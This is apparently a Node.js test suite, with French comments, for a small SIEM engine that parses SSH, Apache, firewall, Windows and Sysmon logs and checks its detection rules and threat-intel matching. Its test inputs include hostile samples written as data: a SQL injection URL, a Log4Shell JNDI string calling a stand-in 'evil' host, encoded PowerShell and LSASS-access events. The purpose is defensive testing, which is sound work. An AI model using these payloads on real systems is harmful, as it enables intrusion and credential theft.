/* Tests Node du moteur JS : il doit détecter les mêmes scénarios que la
 * version Python. Lancer : node web/demo.test.js
 */
const S = require("./minisiem.js");
const RULES = require("./rules.data.js");

let pass = 0, fail = 0;
function ok(name, cond) {
  if (cond) { pass++; } else { fail++; console.error("  ECHEC:", name); }
}
function ids(alerts) { return new Set(alerts.map(a => a.rule_id)); }

// Parsing
ok("parse auth failed", (() => {
  const e = S.parseAuth("Nov  8 02:00:05 web01 sshd[1]: Failed password for root from 203.0.113.66 port 1 ssh2", 2026);
  return e && e.event_type === "ssh_login" && e.outcome === "failure" && e.source_ip === "203.0.113.66";
})());
ok("parse apache 404", (() => {
  const e = S.parseApache('203.0.113.9 - - [08/Nov/2026:13:37:01 +0100] "GET /.env HTTP/1.1" 404 512 "-" "sqlmap/1.7"');
  return e && e.status === 404 && e.user_agent.indexOf("sqlmap") >= 0;
})());
ok("parse ufw block", (() => {
  const e = S.parseUfw("Nov  8 13:37:01 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=5 DPT=23", 2026);
  return e && e.event_type === "fw_block" && e.dest_port === 23;
})());
ok("parse evtx 4625", (() => {
  const e = S.parseEvtxBlock('<Event><System><EventID>4625</EventID><TimeCreated SystemTime="2026-11-08T02:00:05Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">administrateur</Data><Data Name="IpAddress">203.0.113.66</Data></EventData></Event>');
  return e && e.event_id === 4625 && e.outcome === "failure";
})());

// Détections
function ssh(secs, outcome, ip) {
  return {timestamp: new Date(2026, 10, 8, 10, 0, secs), event_type: "ssh_login",
          outcome: outcome, source_ip: ip, user: "admin", raw: "x"};
}
ok("ssh bruteforce", ids(S.runRules(RULES, Array.from({length:15}, (_,i)=>ssh(5*i,"failure","203.0.113.66")))).has("SSH_BRUTEFORCE"));
ok("ssh bruteforce quiet<threshold", !ids(S.runRules(RULES, Array.from({length:4}, (_,i)=>ssh(5*i,"failure","203.0.113.66")))).has("SSH_BRUTEFORCE"));

ok("ssh bruteforce success", (() => {
  const ev = Array.from({length:6}, (_,i)=>ssh(5*i,"failure","198.51.100.23"));
  ev.push(ssh(40,"success","198.51.100.23"));
  return ids(S.runRules(RULES, ev)).has("SSH_BRUTEFORCE_SUCCESS");
})());

ok("web injection", (() => {
  const e = {timestamp:new Date(2026,10,8,10,0,0), event_type:"web_request", outcome:"failure",
             source_ip:"203.0.113.9", status:500, user_agent:"x",
             url:"/p.php?id=1'%20UNION%20SELECT%20pass%20FROM%20users--", raw:"x"};
  return ids(S.runRules(RULES, [e])).has("WEB_INJECTION");
})());
ok("log4shell", (() => {
  const e = {timestamp:new Date(2026,10,8,10,0,0), event_type:"web_request", outcome:"success",
             source_ip:"203.0.113.9", status:200, user_agent:"x",
             url:"/s?q=${jndi:ldap://evil/a}", raw:"x"};
  return ids(S.runRules(RULES, [e])).has("WEB_LOG4SHELL");
})());
ok("port scan distinct", (() => {
  const ev = Array.from({length:25}, (_,i)=>({timestamp:new Date(2026,10,8,10,0,i),
    event_type:"fw_block", outcome:"blocked", source_ip:"198.51.100.77", dest_port:i+1, raw:"x"}));
  return ids(S.runRules(RULES, ev)).has("PORT_SCAN");
})());
ok("port scan same port quiet", (() => {
  const ev = Array.from({length:25}, (_,i)=>({timestamp:new Date(2026,10,8,10,0,i),
    event_type:"fw_block", outcome:"blocked", source_ip:"198.51.100.77", dest_port:443, raw:"x"}));
  return !ids(S.runRules(RULES, ev)).has("PORT_SCAN");
})());
ok("unusual hour", (() => {
  const ev = [];
  for (const h of [8,9,10,11]) for (let k=0;k<2;k++)
    ev.push({timestamp:new Date(2026,10,8,h,10*k), event_type:"win_logon", outcome:"success",
             event_id:4624, user:"jdupont", raw:"x"});
  ev.push({timestamp:new Date(2026,10,8,3,12), event_type:"win_logon", outcome:"success",
           event_id:4624, user:"jdupont", raw:"x"});
  const a = S.runRules(RULES, ev).filter(x=>x.rule_id==="WIN_UNUSUAL_HOUR");
  return a.length===1 && a[0].count===1;
})());

// Sysmon
const SYSMON = (eid, data) => '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">' +
  '<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>' +
  `<EventID>${eid}</EventID><TimeCreated SystemTime="2026-11-08T14:05:31.1234567Z"/>` +
  '<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC01</Computer></System><EventData>' +
  Object.entries(data).map(([k, v]) => `<Data Name="${k}">${v}</Data>`).join("") + '</EventData></Event>';
const WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
const PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
ok("parse sysmon 1 + entités XML", (() => {
  const e = S.parseEvtxBlock(SYSMON(1, {Image: PS, ParentImage: WORD, User: "CORP\\mmartin",
    CommandLine: "powershell.exe -c &quot;Get-Date&quot; &amp;&amp; x"}));
  return e && e.source === "sysmon" && e.event_type === "process_creation" && e.user === "mmartin" &&
    e.command_line === 'powershell.exe -c "Get-Date" && x' && e.parent_process === WORD;
})());
ok("parse sysmon 10 lsass", (() => {
  const e = S.parseEvtxBlock(SYSMON(10, {SourceImage: "C:\\x.exe", TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: "0x1FFFFF"}));
  return e && e.event_type === "process_access" && e.granted_access === "0x1fffff" && e.process === "C:\\x.exe";
})());
ok("eventid 1 hors Sysmon ignoré", S.parseEvtxBlock(SYSMON(1, {Image: PS}).replace(/Sysmon/g, "Other")) === null);
function proc(image, cmd, parent) {
  return {timestamp: new Date(2026, 10, 8, 14, 5), source: "sysmon", event_type: "process_creation",
          outcome: "info", host: "PC01", user: "mmartin", process: image,
          parent_process: parent || "C:\\Windows\\explorer.exe", command_line: cmd, raw: "x"};
}
ok("office -> powershell", ids(S.runRules(RULES, [proc(PS, "powershell -nop", WORD)])).has("SYSMON_OFFICE_SHELL"));
ok("office -> impression silencieux", S.runRules(RULES, [proc("C:\\Windows\\splwow64.exe", "splwow64.exe 12288", WORD)]).length === 0);
ok("powershell -enc", ["-enc", "-EncodedCommand", "-ec", "-e", "/enc"].every(f =>
  ids(S.runRules(RULES, [proc(PS, `powershell.exe -nop ${f} SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA`)])).has("SYSMON_PS_ENCODED")));
ok("powershell -ExecutionPolicy silencieux", S.runRules(RULES, [proc(PS, "powershell -ExecutionPolicy Bypass -File x.ps1", "C:\\Windows\\System32\\svchost.exe")]).length === 0);
function lsass(src, acc) {
  return {timestamp: new Date(2026, 10, 8, 14, 9), source: "sysmon", event_type: "process_access", outcome: "info",
          host: "PC01", process: src, target: "C:\\Windows\\system32\\lsass.exe", granted_access: acc, raw: "x"};
}
ok("lsass accès mémoire", ids(S.runRules(RULES, [lsass("C:\\Windows\\System32\\rundll32.exe", "0x1010")])).has("SYSMON_LSASS_ACCESS"));
ok("lsass antivirus filtré", S.runRules(RULES, [lsass("C:\\ProgramData\\Defender\\MsMpEng.exe", "0x1410")]).length === 0);
ok("échantillon Sysmon : 6 règles + CTI", (() => {
  const ev = S.parseText(require("./samples.js") && globalThis.MINISIEM_SAMPLES.sysmon, 2026);
  const al = S.runRules(RULES, ev);
  const all = al.concat(S.ctiDetectContacts(S.ctiIndex(require("./threat_feed.js")), ev, al));
  const got = ids(all);
  return ["SYSMON_OFFICE_SHELL", "SYSMON_PS_ENCODED", "SYSMON_LOLBIN_DOWNLOAD", "SYSMON_LOLBIN_NETWORK",
          "SYSMON_RUN_KEY", "SYSMON_LSASS_ACCESS", "THREAT_INTEL_HIT"].every(r => got.has(r));
})());
ok("texte et XML mélangés", (() => {
  const s = globalThis.MINISIEM_SAMPLES;
  const n = S.parseText([s.auth, s.win].join("\n"), 2026);
  return n.some(e => e.source === "windows") && n.some(e => e.source === "auth.log");
})());

// CTI
const FEED = require("./threat_feed.js");
const cti = S.ctiIndex(FEED);
ok("cti detects known-bad below threshold", (() => {
  const ev = Array.from({length:3}, (_,i)=>ssh(30*i,"failure","203.0.113.200"));
  const ruleAlerts = S.runRules(RULES, ev);
  const ctiAlerts = S.ctiDetectContacts(cti, ev, ruleAlerts);
  return ctiAlerts.length===1 && ctiAlerts[0].rule_id==="THREAT_INTEL_HIT" && ctiAlerts[0].severity==="critical";
})());
ok("cti enriches matching alert", (() => {
  const ev = Array.from({length:15}, (_,i)=>ssh(5*i,"failure","203.0.113.66"));
  const al = S.runRules(RULES, ev);
  S.ctiEnrich(al, cti);
  const bf = al.find(a=>a.rule_id==="SSH_BRUTEFORCE");
  return bf.threat && bf.threat.category==="bruteforce";
})());

console.log(`\nJS engine: ${pass} réussis, ${fail} échoués.`);
process.exit(fail ? 1 : 0);
